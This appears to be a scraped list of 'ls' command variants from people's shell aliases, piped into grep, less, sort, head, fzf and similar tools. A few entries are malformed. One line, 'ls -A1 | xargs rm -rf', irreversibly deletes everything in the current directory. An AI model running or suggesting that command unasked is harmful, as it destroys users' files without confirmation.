ls -lR ./node_modules | grep ^l
ls -lR --color | less -r
ls -lOFA | more
ls -lGh | sort -n +4
ls -lGh | grep
ls -lGF | sort -k1 -r
ls -lG | grep ^d
ls -lF|cat
ls -lFt | less
ls -lFhp | grep --color=never '^d'
ls -lFh | grep --color=never ^d
ls -lFh | grep --color=never '^d'
ls -lFh | grep
ls -lFh ${colorflag} | grep --color=never '^d'
ls -lFh $colorflag | grep --color=never '^d'
ls -lFh $COLORFLAG | grep --color=never '^d'
ls -lFg $1 | more
ls -lFd .!(|.)
ls -lFa | sed -e \
ls -lFa | less
ls -lFa | grep --color=never '^d'
ls -lFa | grep --color=never '^-'
ls -lFa | TERM=vt100 less
ls -lFN ${colorflag} | grep --color=never '^d'
ls -lFG | grep --color=never '^d'
ls -lFAt | head
ls -lFA | more
ls -lF |grep /
ls -lF | more
ls -lF | less
ls -lF | grep ^d
ls -lF | grep ^-
ls -lF | grep \
ls -lF | grep /
ls -lF | grep -i --color
ls -lF | grep --color=never '^d'
ls -lF | grep '^d'
ls -lF | grep
ls -lF -color | grep --color=never '^d'
ls -lF -G | grep ^d
ls -lF -G | grep --color=never '^d'
ls -lF -G | grep --color=never '^-'
ls -lF -G | grep '^d'
ls -lF --color=auto | grep --color=never '^d'
ls -lF --color=always|less -R
ls -lF --color=always --group-directories-first | /home/danny/.local/bin/coloredls
ls -lF --color | grep /$
ls -lF --color | grep -v '^d'
ls -lF --color | grep --color=never '^d'
ls -lF --color | grep '^d'
ls -lF ${colorflag} | grep -v --color=never '^d'
ls -lF ${colorflag} | grep --color=never '^d'
ls -lF ${colorflag} | grep --color=never ''^d'
ls -lF ${colorflag} | grep --color=never
ls -lF ${colorflag} | grep '^d'
ls -lF ${colorflag} | grep
ls -lF ${colorflag} | ggrep --color=never '^d'
ls -lF ${colorflag} | \grep --color=never '^d'
ls -lF ${colorflag} -p | grep --color=never '^d'
ls -lF ${colorFlag} | grep --color=never '^d'
ls -lF ${co#lorflag} | grep --color=never '^d'
ls -lF $c| egrep -v '^d'
ls -lF $c| egrep '^d'
ls -lF $colorflag | grep --color=never '^d'
ls -lB | grep
ls -lA|less
ls -lA|$PAGER
ls -lAtr |tail
ls -lAt | tail
ls -lAt | head -20
ls -lAt | head
ls -lAt --color=always |head
ls -lArt${ls_option} -F ${ls_colors} ${ls_time_style}|tail -20
ls -lArt${ls_option} -F ${ls_colors} ${ls_time_style}|head -20
ls -lArt | less -i
ls -lArt --color=yes | less -iR
ls -lAi | less
ls -lAh|grep drwx
ls -lAht | head -10
ls -lAhGX --color --group-directories-first | more
ls -lAhF | lolcat
ls -lAhF | grep --color=never '^d'
ls -lAh |wc -l
ls -lAh | wc -l
ls -lAh | less
ls -lAh | grep
ls -lAh | g
ls -lAh | ack -i
ls -lAh --color=auto --g | grep
ls -lAh --color | less -RFX
ls -lAgs | less -r
ls -lAgXh|grep
ls -lAd . .. | grep -v /
ls -lAbFGhT | egrep -v '^d'
ls -lAbFGhT | egrep '^d'
ls -lAbFGh | egrep -v '^d'
ls -lAbFGh | egrep '^d'
ls -lAXh --color=always|less -R
ls -lAS --color=always |head
ls -lARt | grep $1
ls -lAFh | less
ls -lAFg $1 | more
ls -lAFG | grep -v /
ls -lAF | grep \
ls -lA1 ~/.gcp | grep '.json'
ls -lA |grep '^-'
ls -lA |grep
ls -lA | more
ls -lA | less
ls -lA | grep ^d
ls -lA | grep -i
ls -lA | grep --color=auto
ls -lA | grep
ls -lA | egrep ^d
ls -lA | egrep -v ^d
ls -lA | egrep -c
ls -lA | egrep '^l'
ls -lA --color=yes | less -r -E -X
ls -lA --color=always | less -r
ls -lA --color=always | less -RNSJFX
ls -lA --color | less -r
ls -lA ${colorflag} | grep '^d'
ls -lA $* | less
ls -l; echo -n 'total files'; ls -l | wc - l
ls -l. | more
ls -l ~/tools | awk
ls -l | grep ^d
ls -l |more
ls -l |lolcat
ls -l |less
ls -l |grep ^d
ls -l |grep -E
ls -l |grep
ls -l |awk '{print \$1 \
ls -l | wc -l
ls -l | wc
ls -l | sort -nk5
ls -l | sort -n -k $1
ls -l | sort -k5
ls -l | sort -k 6 -n
ls -l | sort +4n
ls -l | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g'
ls -l | sed -e
ls -l | perl -lane 'if ($F[4] == 0 ) { print \$_ };'
ls -l | perl -lane 'if ($F[4] != 0 ) { print \$_ };'
ls -l | peco
ls -l | most
ls -l | more
ls -l | lolcat
ls -l | less
ls -l | head
ls -l | grep ’^d’
ls -l | grep py
ls -l | grep lrw
ls -l | grep dr
ls -l | grep alias .bash_profile
ls -l | grep ^l
ls -l | grep ^drw
ls -l | grep ^d
ls -l | grep ^-
ls -l | grep \
ls -l | grep /
ls -l | grep -v ’^d’
ls -l | grep -v ^d
ls -l | grep -v /
ls -l | grep -v -
ls -l | grep -v '^d'
ls -l | grep -o
ls -l | grep -i
ls -l | grep -e '^d'
ls -l | grep -e
ls -l | grep -P
ls -l | grep -E ^d
ls -l | grep --color=never '^d'
ls -l | grep --color=auto
ls -l | grep --color=always '^d'
ls -l | grep 'dr'
ls -l | grep '^d'
ls -l | grep '$(date +%b\ %_d)'
ls -l | grep $(date +%b\\\ %d)
ls -l | grep
ls -l | egrep -v ^d
ls -l | egrep -v '^d'
ls -l | egrep -v
ls -l | egrep -i
ls -l | egrep '^d'
ls -l | egrep
ls -l | ccze -A
ls -l | awk '{printf \
ls -l | awk '{ if (NR>=2) print \$NF}'
ls -l | awk
ls -l | ag --nocolor -v '^d'
ls -l | ag --nocolor '^d'
ls -l node_modules/ | grep ^l
ls -l node_modules | grep ^l
ls -l node_modules node_modules/@mutualmobile | grep ^l
ls -l \$* | grep '^d'
ls -l \!* | more
ls -l /usr/share/nmap/scripts | grep -i
ls -l /home/semklauke/tools | awk
ls -l /dev/console | awk '{ print \$3 }'
ls -l /dev |grep ttyUSB
ls -l . | egrep -c '^-'
ls -l -d ${colorflag} | grep --color=never '^d'
ls -l -R --indicator-style=none | grep mp3
ls -l -G | more
ls -l -G | egrep '^d'
ls -l -F -t | head
ls -l --sort=time -1 -h ~/downloads | head
ls -l --group-directories-first | less
ls -l --color=tty $* |more
ls -l --color=auto | less
ls -l --color=auto | grep '^d'
ls -l --color=auto html|grep ^d
ls -l --color=always| egrep ^d
ls -l --color=always| egrep '^d'
ls -l --color=always | sort -f
ls -l --color=always | less -R
ls -l --color=always | grep --color=never '^d'
ls -l --color=always --sort=time | less -R
ls -l --color=always $* | less -R
ls -l --color | less -r
ls -l --color | less -FRX
ls -l --color | grep \
ls -l --color | grep
ls -l -- *(*) | head $@ @&> /devl/null
ls -l -- *(*) | head $@ 2&>/dev/null
ls -l *.go | grep -v _test
ls -l *(*) | head
ls -l err.txt generated.file succ.txt | wc -l; du -chs
ls -l ${colorflag} | less
ls -l ${colorflag} | grep --color=never '^d'
ls -l ${colorflag} | grep '^d\'
ls -l ${colorflag} | grep '^d'
ls -l ${colorflag} | egrep '^d'
ls -l ${LS_COLOR_FLAG} | grep '^d'
ls -l ${COLOR_FLAG} | grep ^l
ls -l ${COLOR_FLAG} | grep ^d
ls -l ${COLOR_FLAG} | grep ^-
ls -l $HOME/music/incoming | wc -l
ls -l $1 | tail
ls -l $1 | grep -r ^d
ls -l $1 | grep '^d'
ls -l $(find . -type f | fzy)
ls -l $(find -type f | fzy)
ls -hula -d .[b-z]* |grep -v ^d #
ls -htlF $c| grep `date +%Y-%m-%d`
ls -htl | grep `date +%b`
ls -htl | grep `date +%Y-%m-%d`
ls -ht | head
ls -hrtl *$@* | tail
ls -hrtl *$@* | head
ls -hogFA | less
ls -hlt|head
ls -hltrcF --color=always | tail
ls -hlt --color=always |grep ^d
ls -hlrt | tail
ls -hlrt --color=always |grep ^d
ls -hlr --color=always |grep ^d
ls -hlap | grep /
ls -hlap | grep -v /
ls -hla | more
ls -hla | lolcat
ls -hla | less
ls -hla --sort=extension --group-directories-first --color=yes | less -R
ls -hlS **/*(.Lm+2) | less
ls -hlF ${colorflag} | grep --color=never '^d'
ls -hlAt --color=always |grep ^d
ls -hlArt --color=always |grep ^d
ls -hlAr --color=always |grep ^d
ls -hlAf --color | \grep ~$
ls -hlAF --color | grep -v ^d
ls -hlA --color=always |grep ^d
ls -hl |more
ls -hl | grep ^d
ls -hl | grep -v ^d
ls -hl | grep -v
ls -hl | grep
ls -hl --color=always |grep ^d
ls -halt | head -15
ls -halt | head
ls -halF | less
ls -halF | grep -i
ls -hal1 | grep ^d
ls -hal | more
ls -hal | lolcat -t
ls -hal | less
ls -hal | grep -i
ls -hal -G | more
ls -hablLfF | egrep -v '^d'
ls -hablLfF | egrep '^d'
ls -hablL | egrep -v '^d'
ls -hablL | egrep '^d'
ls -haGlt | head
ls -hFtlG | grep $(date +%Y-%m-%d)
ls -hFtl --color=auto | grep $(date +%Y-%m-%d)
ls -hFtal | grep $(date +%Y-%m-%d)
ls -hFlat | head
ls -hF -lagFqt --color=auto | head
ls -hAlt | head -90
ls -hAlt | head -70
ls -hAlt | head -50
ls -hAlt | head -30
ls -hAlt | head -10
ls -hAlH | less
ls -hAl | grep ^d
ls -hAl | grep -v ^d
ls -h --color | sort -n +4
ls -h --color -ltcr | tail
ls -gv --group-directories-first --color|less -R
ls -gothrA | grep -v '^d'
ls -gothrA | grep '^d'
ls -gothr | grep -v '^d'
ls -gothr | grep '^d'
ls -gost | head -6
ls -go | awk '{print \$7;}'
ls -ghot --color=always |grep ^d
ls -ghort --color=always |grep ^d
ls -ghor --color=always |grep ^d
ls -gho --color=always |grep ^d
ls -ghFA | less
ls -ghFA -t | less
ls -ghFA -t -r | less
ls -ghFA -S | less
ls -ghFA -S -r | less
ls -ghFA --group-directories-first | less
ls -ghA --group-directories-first| less
ls -gathG | tail -10
ls -gathG | head -10
ls -gAhs | more
ls -flh --color | more
ls -fl | /home/danny/.local/bin/coloredls
ls -f . | wc -l
ls -dtr1 ~/.yay-log/* | tail -1
ls -dp .. | grep -v '/$'
ls -dnlhrtGQ --time-style=iso ~/dl/* | awk
ls -dltu /nfs/z*/*/*/* | awk
ls -dC !(*.class|*.o)
ls -d ~/tmp/*(/) | p cd
ls -d ~/src/*/ | xargs -I{} git -C {} fetch
ls -d ~/pictures/screenshots/* --sort=time | head -n 10
ls -d ~/pictures/screenshots/* --sort=time | head -n 1
ls -d ~/downloads/* --sort=time | head -n 1
ls -d ~/Webcam/* --sort=time | head -n 1
ls -d `pwd`/* | grep
ls -d /net/tower-2/scribe/* | xargs -0 -d '\n' -n 1 basename
ls -d .[!.]* .??* | sort -u
ls -d . .. | more
ls -d . .. --color=auto | column -s='\n'
ls -d .!(|.)
ls -d -1 ~/.vim/bundle/* | xargs -I{} git -C {} pull
ls -d -1 */ | sed
ls -d --color=auto .!(|.)
ls -d */|sed 's/\///g'
ls -d */ |cut -d/ -f1
ls -d */ | xargs -i du -sh {}
ls -d */ | xargs -P12 -I{} git -C {} pull
ls -d */ | xargs -P12 -I{} git -C {} fetch --all --prune
ls -d */ | xargs -P12 -I{} git -C {}
ls -d */ | xargs -P10 -I{} git -C {} pull
ls -d */ | xargs -I item du -hs item
ls -d */ | wc -l
ls -d */ | fzf
ls -d */ | cut -f1 -d'/'
ls -d */ | cut -f1 -d
ls -d err.txt generated.file succ.txt | wc -l
ls -d $PWD/* | grep
ls -d $HOME/.m2/repository/**/**/* | grep
ls -d $(pwd)/* | grep
ls -d $(get_projects_home)/T[^0]*/ | while read task; do tasks summary ${task%/}; done
ls -c|sed 10q
ls -ctr1 | tail -1
ls -ct ~/Videos/ | dmenu -i -l 15 -fn
ls -ct | head -n 1
ls -clth | grep -v ^d
ls -clt | grep
ls -chlt | head
ls -catlnh | head
ls -cCFh | grep
ls -c ~/Documents | grep @mac
ls -c ~/Documents | grep @home
ls -c ~/Documents | grep @errands
ls -c $STACK_DIR | nl -nln
ls -bt1 /var/lib/spark/work/app-*-0000/*/stdout | head -1
ls -b $@ | xargs -n 1 xdg-open 2>/dev/null
ls -a|sort>dir.txt
ls -a|less
ls -a|grep -v
ls -a|grep -i --color=auto
ls -a|grep '^\.'
ls -a|grep
ls -a| lolcat
ls -atl|less
ls -atl | less
ls -aslp | grep /
ls -asl | more
ls -arlt | grep ^d
ls -arlt | grep ^-
ls -ap| grep
ls -apl | grep -v '/$'
ls -ap | grep -v /
ls -ap | grep
ls -ao|less
ls -aolA | grep -iE
ls -ao | ack \^d --no-color
ls -ao | ack -v \^d --no-color
ls -ao $VIMPLUGINS | sed s/^[^:]*:[^a-zA-Z]*//g
ls -an | less
ls -al|more --color=auto
ls -al|more
ls -al|lv
ls -al|less
ls -al|grep drw
ls -al|grep ^d
ls -al|grep --color ^d
ls -al|grep --color ^-
ls -alt|more
ls -alt|less
ls -alt|head -20
ls -alt|head
ls -altrh | tr -s \
ls -altrh | less
ls -altrF | more
ls -altr |tail -10
ls -altr | tail -20
ls -altr | tail
ls -altr | more
ls -altr | grep foster
ls -altr | grep ^d
ls -altr | grep -v ^d
ls -alth | less -R
ls -alth | head -n 30
ls -alth | head
ls -altb | head -20
ls -altF | head -15
ls -alt | more
ls -alt | less -R
ls -alt | less
ls -alt | head -n20
ls -alt | head -n 5
ls -alt | head -n 25
ls -alt | head -20
ls -alt | head -16
ls -alt | head
ls -alt | grep ^d
ls -als | grep
ls -alrt | tail -$1
ls -alrt | tail
ls -alrt -F $GREP_COLOR_OPTION | grep $USER
ls -alph --color=auto | less
ls -alpG | less -R
ls -alpG --color | less -R
ls -alp | more
ls -alp | grep -v /
ls -all --color | less
ls -ali --color=always | less
ls -alh|sort -rh -k 5
ls -alh|sort
ls -alh|grep -i
ls -alh|grep
ls -alhtFG --group-directories-first --time-style=+%d-%m-%y --color=always | more
ls -alht | head -n 10
ls -alht | head -20
ls -alht --color=always | grep ^d
ls -alhrt | tail
ls -alheF | most
ls -alheF | less -M
ls -alheF | grep -i
ls -alhSrF | grep /$
ls -alhSp | grep -v / --color=tty
ls -alhG $1 | more
ls -alhG $1 | less
ls -alhF|less
ls -alhF| less
ls -alhF |less
ls -alhF | more
ls -alhF | less -R
ls -alhF | grep /$
ls -alhF --color=always|more
ls -alhB | less
ls -alh |more
ls -alh | peco
ls -alh | more
ls -alh | lv
ls -alh | less
ls -alh | grep ^l
ls -alh | grep ^d
ls -alh | grep ^-
ls -alh | grep -i
ls -alh | grep
ls -alh | ag -v '^d'
ls -alh | ag '^d'
ls -alh /usr/share/nmap/scripts/ | grep -i
ls -alh . | wc
ls -alh . | head
ls -alh -1 --color=always | less -R -C
ls -alh --time-style=+%D | /bin/grep `date +%D`
ls -alh --color=always | awk
ls -alh --color | less -RX
ls -alfGF | less
ls -aldF . .. | grep -v '\/$'
ls -aldF . .. | grep '\/$'
ls -ald err.txt generated.file succ.txt | grep '^d'
ls -ald err.txt generated.file succ.txt | grep '^-..x'
ls -alZ | more
ls -alSr | more
ls -alS --time-style=+%D | rg -i $(date +%D)
ls -alR | less
ls -alGhtT | head -20
ls -alGh | less -R
ls -alG |more
ls -alG | more -f
ls -alG --color | less -r
ls -alF|grep
ls -alFtr|grep ruote
ls -alFtr | tail
ls -alFtr | grep
ls -alFt | less
ls -alFt | grep /$
ls -alFh|sort -h -k 5
ls -alFh | grep
ls -alFb | more
ls -alFRt | grep $_SEARCH
ls -alFG|less
ls -alFG | grep /$
ls -alFG | grep /
ls -alF |grep /grep$
ls -alF | sort -k5 -nr
ls -alF | more
ls -alF | less -R
ls -alF | less
ls -alF | grep drw
ls -alF | grep [^/]$
ls -alF | grep /%
ls -alF | grep /$
ls -alF | grep /
ls -alF | grep -i
ls -alF | grep -e '^d'
ls -alF | grep -e '->'
ls -alF | grep 'r--/'
ls -alF | grep
ls -alF | command less -E
ls -alF -h -t|less
ls -alF --color=always|more
ls -alF --color=always |less -r
ls -alF --color=always | less -R
ls -alF --color |grep /$
ls -alF --color | more
ls -alF --color | less -R
ls -al |most
ls -al |more --color=auto
ls -al |more
ls -al |less -R
ls -al |less
ls -al |grep
ls -al | wc -l
ls -al | tr -s \
ls -al | sort -n -r +4
ls -al | sort -k1 -r
ls -al | pg
ls -al | peco
ls -al | nms -a
ls -al | more
ls -al | lv
ls -al | lolcat
ls -al | less
ls -al | grep grw
ls -al | grep ^l
ls -al | grep ^d
ls -al | grep ^[-l]
ls -al | grep ^[-1]
ls -al | grep \
ls -al | grep /
ls -al | grep -v ^d
ls -al | grep -v /
ls -al | grep -i
ls -al | grep -e '->'
ls -al | grep -Ei --color
ls -al | grep --ignore-case
ls -al | grep '^d'
ls -al | grep '^[-l]'
ls -al | grep '^-'
ls -al | grep $1
ls -al | grep
ls -al | egrep ^d
ls -al | egrep -v '^d'
ls -al | egrep '^d'
ls -al | awk '\$9 ~ /^\./ {print \$0}'
ls -al | \grep \\.[a-z]*
ls -al | ${PAGER}
ls -al | $PAGER
ls -al /etc/apt/sources.list.d/ | less
ls -al -G |grep -i
ls -al -G | more
ls -al -F --color=auto| grep /
ls -al --time-style=+%D | grep `date +%D`
ls -al --human --color=always | more
ls -al --group-directories-first | grep -i
ls -al --color=tty| more
ls -al --color=none|less
ls -al --color=auto | more
ls -al --color=always | more
ls -al --color=always | grep -ve '^d'
ls -al --color | more --RAW-CONTROL-CHARS
ls -al --color | more
ls -al --color | less -r
ls -al --color | less -R
ls -al --color | less
ls -al --color | grep
ls -al ${LS_OPTIONS} |more
ls -al $lscolor|less
ls -ai1|sort
ls -ai1 | sort
ls -ahp --color=auto | grep /
ls -ahp --color | grep /
ls -ahlrt | grep
ls -ahlp --color=auto | grep /
ls -ahlS | grep -v '^d'
ls -ahlFG | less
ls -ahlF | grep /$
ls -ahlF --color | more
ls -ahl |more
ls -ahl | sort -k 9
ls -ahl | more
ls -ahl | grep ^d
ls -ahl | grep -i
ls -ahGp | grep /
ls -ahGlp | grep /
ls -ah | fzf --preview 'if [[ -d {} ]]; then tree {}; else bat --color always {}; fi'
ls -agGhp | cut -c18-90
ls -actl | more
ls -ablhvL --color | grep ^d --color
ls -aRF | wc -l'
ls -aRF | wc -l
ls -aR | grep \
ls -aGg | less -r
ls -aG | ag
ls -aF|grep \/
ls -aFlhRX | less
ls -aFhl --color=always | less -r
ls -aFh ${colorflag} | egrep '^\.'
ls -aFGhlt | head -10
ls -aFGR | less
ls -aFG | less -R
ls -aF | sort -r
ls -aF | grep [^/]$
ls -aF | grep /$
ls -aF | grep /
ls -aF | grep -v /
ls -aBlp | less
ls -a1F | grep /$
ls -a |less
ls -a | xargs grep --color=auto
ls -a | xargs du -hs
ls -a | xargs du -h -s
ls -a | xargs -I{} du -hs {}
ls -a | wc > file
ls -a | wc -l
ls -a | rg
ls -a | peco
ls -a | more
ls -a | less
ls -a | grep ^.*
ls -a | grep /
ls -a | grep -v /
ls -a | grep -i --color=auto
ls -a | grep -i $1
ls -a | grep -i
ls -a | grep -Ei --color
ls -a | grep --color=never '^\.'
ls -a | grep --color=auto
ls -a | grep '^\\.'
ls -a | grep '^\.[a-zA-Z]\+.*'
ls -a | grep '^\.'
ls -a | grep '^-'
ls -a | grep
ls -a | fzf
ls -a | find ./ -empty -printf
ls -a | egrep -i
ls -a | egrep '^\.'
ls -a | egrep
ls -a | du -sh err.txt generated.file succ.txt
ls -a | awk '{print $NF}'
ls -a | ag
ls -a | __filter_execute gomi
ls -a . .. | more
ls -a -l | lv
ls -a -l | less -N
ls -a -l | grep -v '^d'
ls -a -l --color=yes|egrep -i
ls -a --format=across | egrep '^\.'
ls -a --color=yes|egrep -i
ls -a --color=auto | grep --color=auto '/'
ls -a --color=auto | g
ls -a --color=always |more
ls -a --color | egrep \^\\.
ls -a $LS_COLOR | grep ^\\.
ls -XA --color=always | less -ieMXSRJ
ls -Uba1 | wc -l
ls -Ub1 | wc -l
ls -U1 | wc -l
ls -U | wc -l
ls -Slrh|tail
ls -Slhr | head
ls -Slh | head
ls -Slh | grep -v ^d
ls -Sl | less
ls -Sl *(.) | tail
ls -Sl *(.) | head
ls -Shl | less
ls -SGhl | less
ls -S1hr | head
ls -S1h | head
ls -S -1 --color -A -F --group-directories-first | sort
ls -RFlA | more
ls -R |grep \
ls -R | wc -cl
ls -R | sed -e
ls -R | less
ls -R | grep suc
ls -R | grep dif
ls -R | grep \
ls -R | grep -i
ls -R | grep -e dif -e suc
ls -R | grep
ls -R | ag $1
ls -R lib | grep
ls -R . | wc -l
ls -R -mA | grep
ls -R -mA -t --group-directories-first | grep
ls -R -mA -S --group-directories-first | grep
ls -R --color=auto | grep
ls -R ${colorflag} | grep
ls -R ${PWD} | grep
ls -N --color=auto | sort -k 2 -k 1M -k2
ls -Lla|grep ^d
ls -L1p | grep /
ls -Hal | less
ls -Gp | grep /
ls -Gp | grep -v /
ls -Glrt | sort -r -k 10
ls -Glh | less
ls -Glh | grep ^d
ls -Glahtr | tail
ls -GlahF | grep --color=never
ls -Gl | grep ^d
ls -Gl ${colorflag} | grep ^d
ls -GgahF | grep $*
ls -GgaF | grep $*
ls -Galh | grep ^d
ls -Gal | grep ^d
ls -Gal --color | grep ^d
ls -GFal | grep ^d
ls -GF | less
ls -GF | grep @
ls -GF -lt | awk
ls -G1t | head
ls -G | grep -v .pyc
ls -G | grep
ls -G | ag
ls -G -w -al | peco
ls -G -w -a | peco
ls -G -lrt | tail -5
ls -G -lh | grep '^d'
ls -G -lah | less
ls -G -hal | less
ls -G -hal | grep --color=auto -n
ls -G -alh | less
ls -F|grep /
ls -F|grep -v /
ls -F| grep /
ls -Ftrl|plcline.pl
ls -FtrAl|plcline.pl
ls -Fth . | head -n 25
ls -Fo --color=always | grep ^-..x
ls -Fo --color=always | grep ^-
ls -Flagt $@ | head
ls -Fla $1 $2 $3 $4 $5 | awk '{ print; x=x+\$5 } END { print \
ls -FlAtUu | head
ls -FlAt | head -n 20
ls -FlAt | head
ls -FlAp | grep */
ls -FlA | grep \*
ls -FlA | grep :*/
ls -FlA | grep -v \*
ls -Fl --color=always | most
ls -Fht $l| grep `date +%Y-%m-%d`
ls -FhAls | less -r
ls -FhAls --color=never | less -r
ls -Fh $l| egrep -v '^d'
ls -Fh $l| egrep '^d'
ls -Fg $1 | more
ls -Falog | more
ls -Falht | head -n 15
ls -Falht --color=auto | head -n 15
ls -Falh | less -eg
ls -Falh --color=auto | grep -i --color=auto
ls -Fal ~/tars|more
ls -Fal ~/tars | more
ls -Fal ~/MAIN/tars | more
ls -Fal --time-style=long-iso | more
ls -Fahl | less -R
ls -FX | grep -v /
ls -FGrt | tail -1
ls -FGoah | awk '{ print $1 $3 $4 $8 }'
ls -FGlAhp | grep /
ls -FGhl | grep --color=never '^d'
ls -FG | grep
ls -FCp -w 120|less -FRMS
ls -FAlt | less
ls -FAlht | head -n 20
ls -FAlh | grep -i
ls -FA |grep '/$'
ls -F${LSOPT} -l -t | head
ls -F${LSOPT} -l -rt | tail
ls -F${LSOPT} -l -Art | tail
ls -F |grep /$
ls -F |grep /
ls -F | mc
ls -F | m
ls -F | less
ls -F | grep \*
ls -F | grep @
ls -F | grep /$
ls -F | grep /
ls -F | grep -v /
ls -F | grep --color=never '^d'
ls -F | grep '^d'
ls -F | grep '/$'
ls -F | grep '*'
ls -F | ccze -A
ls -F | \grep [^/]$
ls -F | \grep /$
ls -F -s | grep \*
ls -F -al | more
ls -F --color=auto | grep
ls -F --color=auto -l | sed -e 's/--x/1/g' -e 's/-w-/2/g' -e 's/-wx/3/g' -e 's/r--/4/g' -e 's/r-x/5/g' -e 's/rw-/6/g' -e 's/rwx/7/g' -e 's/---/0/g'
ls -F --color | ls -d */
ls -F ${colorflag} | grep --color=never '^d'
ls -F $(ls --help 2>&1 | grep -qo -- --color && echo
ls -Cw $COLUMNS --color | less -FRX
ls -Cp -w 120|less -FRMS
ls -CFb | more
ls -CFalh --color=auto | grep --color=auto -i
ls -CFa | less
ls -CFA --color=always | more
ls -CF | more
ls -CF | less -N
ls -CF | less
ls -CF --color=always | more
ls -CAR --color=auto | more
ls -C | less
ls -C | ccze -A
ls -C --color=always | less -R
ls -A|less
ls -A| wl
ls -Artls | tail -n1
ls -Art ~/Videos/*.webm | tail -n 1
ls -Art | tail -n1
ls -Art | tail -n 10
ls -Art | tail -n 1
ls -ApR | grep
ls -ApCG -1 | peco
ls -Ap | grep /$
ls -Aoh | grep --color=auto -iP
ls -Aoh | grep --color=auto -i
ls -Aoh | grep --color=auto
ls -Altu | head -n 25
ls -Altu | head -n 10
ls -Alt |more
ls -Alt | head -n 25
ls -Alt | head -n 10
ls -Alt | head
ls -AlshHFG | less -R
ls -AlshHFG | grep
ls -AlsGt | zmore
ls -Alrt | tail -n10
ls -Alht |more
ls -Alht --color=always | \less -r
ls -AlhF |less
ls -AlhF --color=auto |less
ls -Alh |more
ls -Alh | less
ls -Alh | grep -i
ls -Alh | grep --color=auto
ls -Alh | grep
ls -Alh --color=auto | grep -i
ls -Alh --color=auto --time-style=+%D | grep `date +%D`
ls -AlGFhi | less
ls -AlFh --color | grep ^drw
ls -AlFh --color | grep -v ^drw
ls -AlF | more
ls -AlF | less
ls -AlF | grep /$
ls -AlF | grep -i
ls -AlF --color=always | grep '^d' --color=never
ls -AlF --color=always --group-directories-first | less -R
ls -AlF --color=always --group-directories-first | less
ls -Al |more
ls -Al | tail -n+2
ls -Al | sort
ls -Al | more
ls -Al | less -r
ls -Al | less
ls -Al | grep
ls -Al --color=always | grep --color=never ^d
ls -Al --color --group-directories-first | less -r
ls -Al $1 | less
ls -AhltF --color | head
ls -Ahlo | grep --color=never '^d'
ls -Ahlo | grep --color=never '^-'
ls -Ahl |more
ls -Ahl | less'
ls -AhF | grep -i $1
ls -Ah | egrep '^\.'
ls -Aghot --color=always |grep ^d
ls -Aghot --color=always | less $LESSOPTS
ls -Aghort --color=always |grep ^d
ls -Aghor --color=always |grep ^d
ls -Agho --color=always |grep ^d
ls -Agho --color=always | less $LESSOPTS
ls -AalhG --color=auto |grep $1
ls -AaR | filter
ls -ARoh | grep --color=auto -i
ls -AGFhop | grep
ls -AGFh | column
ls -AFhlG | grep -v .DS_Store
ls -AFhl | less
ls -AFh | grep
ls -AFg $1 | more
ls -AFGhlS | egrep '^d'
ls -AFGhl | grep --color -i
ls -AFGhl | egrep -v '^d'
ls -AF1 | grep '\$'
ls -AF | grep /$
ls -AF | grep /
ls -AF | grep -vc @
ls -AF | grep -v /
ls -AF | grep -v '^d'
ls -AF | grep
ls -AF *|grep \/
ls -ABGhR --group-directories-first | less
ls -A1|wc -l
ls -A1t | head -1
ls -A1 | xargs rm -rf
ls -A1 | wc -l
ls -A1 | _copy_and_print '\n'
ls -A |wc -w
ls -A |grep -i
ls -A | wc -l
ls -A | more
ls -A | less -R
ls -A | less
ls -A | grep ^\\.
ls -A | grep -v /
ls -A | grep -v .DS_Store
ls -A | grep -v -e
ls -A | grep -i
ls -A | grep -e ^\\.
ls -A | grep --color=auto -iP
ls -A | grep --color=auto -i
ls -A | grep --color=auto
ls -A | grep
ls -A | egrep '^\\.'
ls -A | egrep '^\.'
ls -A | egrep
ls -A -1 | grep -v .DS_Store
ls -A --group-directories-first | h -i $LS_ALL
ls -A --group-directories-first | egrep '^\.'
ls -A --color=none | xargs du -sh
ls -A --color=auto | grep -v -e
ls -A ${ls_color_option} | less -iFNQRX
ls -1|wc -l
ls -1| wc -l
ls -1v |grep .mp3 >
ls -1v |grep .m4a >
ls -1v |grep .flac >
ls -1v | tail
ls -1tr | tail -1
ls -1tr | tail
ls -1tr | last
ls -1tl | head -20
ls -1t | tail -5
ls -1t | head -5
ls -1t | head -30
ls -1t | head -1
ls -1t | head
ls -1rt ~/Screenshots | tail -1
ls -1q | wc -l
ls -1p | sed -n '/\/$/s/^/ /p;'
ls -1hFAlG |less -r
ls -1hFAl --color=auto |less -r
ls -1hFAl --color=always |less -r
ls -1d */ | xargs -L1d -I{} -- sh -c \
ls -1aF | grep
ls -1a | wc -l
ls -1a -I. -I.. | wc -l
ls -1U err.txt generated.file succ.txt | wc -l
ls -1Fha --color=force | less -R
ls -1FSsh | sort -r
ls -1F | grep --color=never '\/$'
ls -1AFGl | grep
ls -1AF | sed '/[@/]$/d;s/\*$//'
ls -1AF | grep '@$'
ls -1 ~/notes/\`ls -1t ~/notes | head -n1\`
ls -1 ~/dotfiles/gists/* | fzf --exit-0 --bind 'enter:execute(vim --not-a-term -- {})+abort'
ls -1 ~/.config/yarn/global/node_modules | fzf -e --reverse
ls -1 |wc -l
ls -1 |fpp -ai
ls -1 | wc -l
ls -1 | tail -n $1
ls -1 | sort -f
ls -1 | sed -e 's/\.[a-zA-Z]*$//'
ls -1 | sed -e 's/\..*$//'
ls -1 | sed 's/\(.*\)\..*/\1/'
ls -1 | peco >>! .gitignore
ls -1 | more
ls -1 | grep ^d
ls -1 | grep -v -- _[0-9]*$
ls -1 | grep -v
ls -1 | grep -i \!*
ls -1 | grep --color .
ls -1 | column -c 100
ls -1 /usr/share/lxc/templates/ | sed 's/lxc-/+ /'
ls -1 /usr/local/lib/node_modules | fzf -e --reverse
ls -1 /usr/local/bin/kentUtils | egrep -i
ls -1 ./node_modules | fzf -e --reverse
ls -1 . | wc -l
ls -1 . | sed -e 's/\.[a-z]\{3\}$//'
ls -1 -l --color=none | tr a-z A-Z
ls -1 -dtr err.txt generated.file succ.txt | tail -1
ls -1 -d */ | xargs -n 2 -P 8 flake8 -j 1
ls -1 -d */ | tr '\n' ' '
ls -1 -R --indicator-style=none | grep pdf
ls -1 -R --indicator-style=none | grep epub
ls -1 -F -t -l \!* | more
ls -1 --color=always | less -R -C
ls -1 --color=always | grep
